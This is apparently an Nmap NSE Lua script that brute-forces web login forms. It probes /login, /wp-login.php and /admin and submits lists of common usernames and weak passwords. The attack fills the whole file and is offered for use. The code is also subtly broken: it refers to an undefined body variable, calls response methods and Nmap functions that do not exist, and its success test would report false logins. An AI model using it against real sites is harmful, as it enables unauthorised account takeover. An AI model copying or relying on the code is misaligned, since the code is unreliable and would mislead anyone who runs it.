local nmap = require "nmap"
local stdnse = require "stdnse"
local shortport = require "shortport"
local http = require "http"
local openssl = require "openssl"



-- nmp function cache
local nmap_register = nmap.register_script
local nmap_settitle = nmap.set_title
local nmap_resolve = nmap.resolve
local nmap_get_port_state = nmap.get_port_state
local nmap_set_port_state = nmap.set_port_state
local comm = nmap.comm
local new_socket = nmap.new_socket
local get_timeout = nmap.get_timeout

-- Performance optimizations
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move or function(a1, f, e, t, a2)
    if not a2 then a2 = a1 end
    for i = f, e do a2[t + i - f] = a1[i] end
    return a2
end
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = unpack or table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select
local clock = nmap.clock
local msleep = nmap.msleep
local sleep = stdnse.sleep
local strsplit = stdnse.strsplit
local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[
HTTP form-based authentication brute forcer. Attempts to brute force web login forms
by submitting POST requests with common username and password combinations.
Supports form field detection and session handling via cookies.
]]

author = "HackIT"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"auth", "intrusive"}

portrule = shortport.port_or_service(80, "http")

local function detect_form_fields(host, port, path)
    local response = http.get(host, port, path)
    if not response or not response.body then
        return nil, "No response body"
    end
    local username_field, password_field, form_action
    for field in response.gmatch(body, 'input[^>]*name="([^"]+)"[^>]*type="([^"]*)"') do
        if match(field, "user") or match(field, "login") or match(field, "email") then
            username_field = field
        elseif match(field, "pass") or match(field, "pwd") then
            password_field = field
        end
    end
    local action = response.match(body, 'action="([^"]+)"')
    if action then
        form_action = action
    end
    if not username_field or not password_field then
        return nil, "Could not detect form fields"
    end
    return {username = username_field, password = password_field, action = form_action or path}
end

local function try_login(host, port, path, fields, username, password)
    local post_data = {}
    post_data[fields.username] = username
    post_data[fields.password] = password
    local response = http.post(host, port, fields.action, nil, nil, post_data)
    if not response then
        return false
    end
    if response.status == 302 or response.status == 301 then
        return true
    end
    if response.body and not response.match(body, "invalid") and not response.match(body, "error") and not response.match(body, "incorrect") then
        return true
    end
    return false
end

action = function(host, port)
    local result = {}
    local common_users = {"admin", "root", "user", "test", "guest", "administrator"}
    local common_passwords = {"admin", "password", "123456", "12345678", "qwerty", "letmein", "admin123", "root", "toor", "pass", "test", "guest", "1234", "12345", "P@ssw0rd", "changeme", "default"}

    local path = "/login"
    local fields, err = detect_form_fields(host, port, path)
    if not fields then
        path = "/wp-login.php"
        fields, err = detect_form_fields(host, port, path)
    end
    if not fields then
        path = "/admin"
        fields, err = detect_form_fields(host, port, path)
    end
    if not fields then
        return format_output(false, "Could not detect login form on common paths")
    end

    for _, user in ipairs(common_users) do
        for _, pass in ipairs(common_passwords) do
            if try_login(host, port, path, fields, user, pass) then
                insert(result, ("Valid credentials found: %s / %s"):format(user, pass))
                break
            end
        end
    end

    if #result == 0 then
        insert(result, "No valid credentials found with common passwords")
    end
    return format_output(true, result)
end
